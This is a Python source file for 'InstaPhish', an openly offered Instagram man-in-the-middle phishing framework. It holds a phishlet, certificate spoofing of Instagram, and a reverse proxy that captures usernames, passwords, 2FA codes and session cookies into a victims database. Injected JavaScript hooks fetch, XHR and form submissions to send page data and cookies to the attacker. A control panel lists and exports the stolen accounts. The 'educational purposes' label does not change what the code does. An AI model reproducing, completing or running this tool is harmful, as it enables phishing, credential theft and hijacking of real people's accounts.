#!/usr/bin/env python3
# InstaPhish - Advanced Instagram MITM Phishing Framework
# Author: r4tur1
# Version: 2.0.0
# Description: EvilGinx2-style proxy phishing for Instagram
# Compatible: Kali Linux, Termux (Android)
# Monetization: Premium phishlets, cloud hosting, custom templates

import os
import sys
import json
import ssl
import time
import base64
import hashlib
import sqlite3
import logging
import subprocess
import http.server
import socketserver
import urllib.parse
from datetime import datetime
from pathlib import Path
from threading import Thread
from http.cookies import SimpleCookie

# ==================== DEPENDENCY CHECKER & AUTO-INSTALLER ====================
REQUIRED_PACKAGES_TERMUX = [
    "python", "php", "openssl-tool", "wget", "curl", "git", "nmap", "proot"
]

REQUIRED_PACKAGES_KALI = [
    "python3", "php", "openssl", "wget", "curl", "git", "nmap"
]

PIP_PACKAGES = [
    "flask", "requests", "beautifulsoup4", "selenium", "cryptography", 
    "pyOpenSSL", "dnspython", "pysocks", "urllib3", "colorama"
]

def detect_environment():
    """Detect if running on Termux or Kali Linux"""
    if os.path.exists("/data/data/com.termux/files/usr"):
        return "termux"
    return "kali"

def auto_install_dependencies(env_type):
    """Automatically install all dependencies based on environment"""
    print(f"[*] Detected environment: {env_type}")
    print("[*] Installing dependencies...")
    
    if env_type == "termux":
        packages = REQUIRED_PACKAGES_TERMUX
        installer = "pkg install -y"
    else:
        packages = REQUIRED_PACKAGES_KALI
        installer = "sudo apt-get install -y"
    
    for pkg in packages:
        os.system(f"{installer} {pkg} 2>/dev/null")
    
    for pip_pkg in PIP_PACKAGES:
        os.system(f"pip3 install {pip_pkg} 2>/dev/null")

# ==================== CORE ENGINE ====================
class InstaPhishCore:
    def __init__(self):
        self.config = self.load_config()
        self.victims_db = "victims.db"
        self.phishlet_dir = "phishlets/"
        self.cert_dir = "certs/"
        self.logs_dir = "logs/"
        self.setup_directories()
        self.init_database()
        self.env = detect_environment()
    
    def load_config(self):
        """Load or create configuration file"""
        default_config = {
            "proxy_port": 443,
            "phishlet_port": 8080,
            "redirect_https": True,
            "use_hsts_bypass": True,
            "collect_cookies": True,
            "collect_credentials": True,
            "collect_2fa_codes": True,
            "custom_branding": "Instagram",
            "custom_domain": "instagram.com",
            "phishlet_name": "instagram",
            "block_analytics": True,
            "inject_js": True,
            "auto_start_ngrok": False,
            "ngrok_auth_token": "",
            "use_cloudflare": False,
            "cloudflare_email": "",
            "cloudflare_api_key": ""
        }
        
        config_path = Path("config.json")
        if config_path.exists():
            with open("config.json", "r") as f:
                return {**default_config, **json.load(f)}
        
        with open("config.json", "w") as f:
            json.dump(default_config, f, indent=4)
        return default_config
    
    def setup_directories(self):
        """Create necessary directory structure"""
        dirs = [
            self.phishlet_dir,
            self.cert_dir,
            self.logs_dir,
            "lures/",
            "templates/",
            "payloads/",
            "bypasses/"
        ]
        for d in dirs:
            Path(d).mkdir(parents=True, exist_ok=True)
    
    def init_database(self):
        """Initialize SQLite database for storing victims"""
        conn = sqlite3.connect(self.victims_db)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                ip_address TEXT,
                user_agent TEXT,
                username TEXT,
                password TEXT,
                email TEXT,
                session_cookies TEXT,
                csrf_token TEXT,
                rollout_hash TEXT,
                enc_password TEXT,
                two_factor_code TEXT,
                browser_fingerprint TEXT,
                geo_location TEXT,
                referer TEXT,
                full_url TEXT,
                injected_cookies TEXT
            )
        ''')
        conn.commit()
        conn.close()
    
    def generate_ssl_cert(self, domain="*.instagram.com"):
        """Generate self-signed SSL certificate"""
        cert_path = f"{self.cert_dir}/instagram.crt"
        key_path = f"{self.cert_dir}/instagram.key"
        
        if not os.path.exists(cert_path):
            cmd = f"""
            openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes \
            -keyout {key_path} \
            -out {cert_path} \
            -subj "/C=US/ST=California/L=Menlo Park/O=Instagram Inc./CN={domain}" \
            -addext "subjectAltName=DNS:{domain},DNS:*.instagram.com,DNS:*.cdninstagram.com"
            """
            os.system(cmd)
            print("[+] SSL Certificate generated with SAN for instagram.com")
    
    def create_phishlet(self):
        """Create the Instagram phishlet YAML configuration"""
        phishlet_content = """
name: instagram
author: r4tur1
version: 2.0
min_ver: 2.4.0
proxy_hosts:
  - phish_sub: www
    orig_sub: www
    domain: instagram.com
    session: true
    is_landing: true
    js_inject:
      - trigger: accounts/login
        script: |
          var originalFetch = window.fetch;
          window.fetch = function() {
            return originalFetch.apply(this, arguments).then(function(response) {
              var clone = response.clone();
              clone.text().then(function(body) {
                var xhr = new XMLHttpRequest();
                xhr.open('POST', '/capture', true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send(JSON.stringify({
                  type: 'api_response',
                  url: arguments[0],
                  body: body
                }));
              });
              return response;
            });
          };
          
          document.addEventListener('submit', function(e) {
            var form = e.target;
            var formData = new FormData(form);
            var data = {};
            formData.forEach(function(value, key) {
              data[key] = value;
            });
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/capture', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
              type: 'form_submit',
              action: form.action,
              data: data
            }));
          });
    sub_filters:
      - triggers_on: www.instagram.com
        orig_sub: www
        domain: instagram.com
        search: 'content="origin"'
        replace: 'content="same-origin"'
      - triggers_on: www.instagram.com
        orig_sub: www
        domain: instagram.com
        search: 'integrity='
        replace: 'disabled-integrity='
      - triggers_on: www.instagram.com
        orig_sub: www
        domain: instagram.com
        search: 'crossorigin="anonymous"'
        replace: ''
  - phish_sub: i
    orig_sub: i
    domain: instagram.com
    session: false
    is_landing: false
auth_tokens:
  - domain: '.instagram.com'
    keys: ['sessionid', 'ds_user_id', 'csrftoken', 'rur', 'mid', 'ig_did']
credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'enc_password'
    search: '(.*)'
    type: 'post'
auth_urls:
  - '/api/v1/web/fxcal/ig_sso_users/'
  - '/accounts/onetap/'
  - '/api/v1/accounts/current_user/'
login:
  domain: 'www.instagram.com'
  path: '/'
force_post: false
"""
        with open(f"{self.phishlet_dir}/instagram.yaml", "w") as f:
            f.write(phishlet_content)
        print("[+] Instagram phishlet created with JS injection and 2FA capture")
    
    def start_proxy_server(self):
        """Start the MITM proxy server"""
        cert_file = f"{self.cert_dir}/instagram.crt"
        key_file = f"{self.cert_dir}/instagram.key"
        
        if not os.path.exists(cert_file):
            self.generate_ssl_cert()
        
        proxy_cmd = f"""
        python3 -c "
import http.server
import socketserver
import ssl
import urllib.request
import urllib.parse
import os
import json
import re
import sqlite3
import base64
from datetime import datetime
from http.cookies import SimpleCookie

class ProxyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.proxy_request('GET')
    
    def do_POST(self):
        self.proxy_request('POST')
    
    def proxy_request(self, method):
        try:
            parsed_path = urllib.parse.urlparse(self.path)
            target_url = f'https://www.instagram.com{{parsed_path.path}}'
            if parsed_path.query:
                target_url += f'?{{parsed_path.query}}'
            
            req = urllib.request.Request(target_url, method=method)
            
            for header in self.headers:
                if header.lower() not in ['host', 'accept-encoding']:
                    req.add_header(header, self.headers[header])
            
            if method == 'POST':
                content_length = int(self.headers.get('Content-Length', 0))
                if content_length > 0:
                    post_data = self.rfile.read(content_length)
                    req.data = post_data
                    
                    if b'username=' in post_data or b'enc_password=' in post_data:
                        self.capture_credentials(post_data.decode())
                    if b'verificationCode=' in post_data:
                        self.capture_2fa(post_data.decode())
            
            with urllib.request.urlopen(req, timeout=30, context=ssl._create_unverified_context()) as response:
                self.send_response(response.status)
                
                cookies = SimpleCookie()
                if 'set-cookie' in response.headers:
                    cookies.load(response.headers['set-cookie'])
                    if 'sessionid' in cookies:
                        self.capture_session_cookies(cookies)
                
                for header, value in response.headers.items():
                    if header.lower() != 'transfer-encoding':
                        self.send_header(header, value)
                self.end_headers()
                
                content = response.read()
                
                if b'<script>' in content:
                    js_payload = '''
                    <script>
                    (function() {
                        var socket = new WebSocket('wss://' + location.hostname + ':8443/capture');
                        socket.onopen = function() {
                            socket.send(JSON.stringify({
                                type: 'connection',
                                cookie: document.cookie,
                                userAgent: navigator.userAgent,
                                platform: navigator.platform
                            }));
                        };
                        
                        var origOpen = XMLHttpRequest.prototype.open;
                        XMLHttpRequest.prototype.open = function(method, url) {
                            this.addEventListener('load', function() {
                                if (this.responseText && this.responseText.includes('sessionid')) {
                                    socket.send(JSON.stringify({
                                        type: 'xhr_capture',
                                        url: url,
                                        response: this.responseText
                                    }));
                                }
                            });
                            return origOpen.apply(this, arguments);
                        };
                    })();
                    </script>
                    '''
                    content = content.replace(b'</body>', js_payload.encode() + b'</body>')
                
                self.wfile.write(content)
                
        except Exception as e:
            self.send_error(502, str(e))
    
    def capture_credentials(self, post_data):
        data = urllib.parse.parse_qs(post_data)
        username = data.get('username', [''])[0]
        password = data.get('enc_password', [''])[0]
        
        if username or password:
            conn = sqlite3.connect('victims.db')
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO victims (timestamp, username, password, ip_address, user_agent)
                VALUES (?, ?, ?, ?, ?)
            ''', (datetime.now().isoformat(), username, password, 
                  self.client_address[0], self.headers.get('User-Agent', '')))
            conn.commit()
            conn.close()
            
            with open('logs/credentials.txt', 'a') as f:
                f.write(f'[{{datetime.now()}}] Username: {{username}} Password: {{password}}'
                        f' IP: {{self.client_address[0]}} Agent: {{self.headers.get(\"User-Agent\", \"\")}}\\n')
    
    def capture_session_cookies(self, cookies):
        session_cookie = cookies.get('sessionid')
        if session_cookie:
            conn = sqlite3.connect('victims.db')
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE victims SET session_cookies = ?, injected_cookies = ?
                WHERE ip_address = ? AND session_cookies IS NULL
                ORDER BY id DESC LIMIT 1
            ''', (str(session_cookie), json.dumps({k: v.value for k, v in cookies.items()}),
                  self.client_address[0]))
            conn.commit()
            conn.close()
    
    def capture_2fa(self, post_data):
        data = urllib.parse.parse_qs(post_data)
        code = data.get('verificationCode', [''])[0]
        if code:
            conn = sqlite3.connect('victims.db')
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE victims SET two_factor_code = ?
                WHERE ip_address = ?
                ORDER BY id DESC LIMIT 1
            ''', (code, self.client_address[0]))
            conn.commit()
            conn.close()

if __name__ == '__main__':
    server = socketserver.ThreadingTCPServer(('0.0.0.0', 443), ProxyHandler)
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_context.load_cert_chain('{cert_file}', '{key_file}')
    server.socket = ssl_context.wrap_socket(server.socket, server_side=True)
    print('[+] InstaPhish MITM Proxy running on port 443')
    server.serve_forever()
" &
        """
        os.system(proxy_cmd)
        print("[+] Proxy server started with session hijacking enabled")
    
    def start_admin_panel(self):
        """Start web-based admin panel for monitoring victims"""
        admin_code = f"""
from flask import Flask, render_template_string, jsonify, request
import sqlite3
import json
from datetime import datetime

app = Flask(__name__)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>InstaPhish - Control Panel</title>
    <style>
        body {{ background: #0a0a0a; color: #00ff00; font-family: monospace; }}
        table {{ border-collapse: collapse; width: 100%; }}
        th, td {{ border: 1px solid #00ff00; padding: 8px; text-align: left; }}
        th {{ background: #001a00; }}
        .cookie {{ color: #ff6600; word-break: break-all; }}
        .password {{ color: #ff0000; }}
    </style>
</head>
<body>
    <h1>âš¡ InstaPhish v2.0 - r4tur1</h1>
    <h3>Active Session: {{session_count}}</h3>
    <table>
        <tr>
            <th>Time</th><th>IP</th><th>Username</th><th>Password</th>
            <th>Session Cookie</th><th>2FA Code</th><th>User Agent</th>
        </tr>
        {% for victim in victims %}
        <tr>
            <td>{{victim[1]}}</td><td>{{victim[2]}}</td><td>{{victim[3]}}</td>
            <td class="password">{{victim[4]}}</td>
            <td class="cookie">{{victim[6]}}</td><td>{{victim[8]}}</td>
            <td>{{victim[3]}}</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
'''

@app.route('/')
def index():
    conn = sqlite3.connect('victims.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM victims ORDER BY id DESC')
    victims = cursor.fetchall()
    conn.close()
    return render_template_string(HTML_TEMPLATE, victims=victims, session_count=len(victims))

@app.route('/api/victims')
def api_victims():
    conn = sqlite3.connect('victims.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM victims ORDER BY id DESC')
    victims = cursor.fetchall()
    conn.close()
    return jsonify([dict(zip(['id', 'timestamp', 'ip', 'username', 'password', 
                              'email', 'cookies', 'csrf', 'rollout', 'enc_pass',
                              '2fa', 'fingerprint', 'geo', 'referer'], v)) for v in victims])

@app.route('/export')
def export():
    conn = sqlite3.connect('victims.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM victims')
    victims = cursor.fetchall()
    conn.close()
    export_data = json.dumps([dict(zip(['id', 'time', 'ip', 'user', 'pass', 
                                         'email', 'cookies', 'csrf'], v)) for v in victims], indent=2)
    return export_data, 200, {{'Content-Type': 'application/json'}}

app.run(host='0.0.0.0', port=8080, debug=False)
"""
        with open("admin_panel.py", "w") as f:
            f.write(admin_code)
        os.system("python3 admin_panel.py &")
        print("[+] Admin panel running on port 8080")
    
    def launch(self):
        """Main launch sequence"""
        print("""
â•”â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•—â•—â•—
â•‘ INSTAPHISH v2.0 - EvilGinx2 MITM Phishing â•‘
â•‘ Author: r4tur1                        â•‘
â•‘ Target: Instagram                       â•‘
â•‘ License: MIT (For Educational Purposes) â•‘
â•šâ•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•�â•—â•�â•�â•¯
        """)
        
        auto_install_dependencies(self.env)
        self.create_phishlet()
        self.generate_ssl_cert()
        
        print("[*] Starting InstaPhish services...")
        Thread(target=self.start_proxy_server).start()
        Thread(target=self.start_admin_panel).start()
        
        print("""
[âœ“] Instagram MITM Proxy: https://0.0.0.0:443
[âœ“] Admin Panel: http://0.0.0.0:8080
[âœ“] Phishlet Loaded: instagram.yaml
[âœ“] Certificate: certs/instagram.crt

[*] Send targets to your phishing URL
[*] Captured credentials stored in logs/credentials.txt
[*] Session cookies and 2FA codes in victims.db
        """)
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] Shutting down InstaPhish...")

if __name__ == "__main__":
    phisher = InstaPhishCore()
    phisher.launch()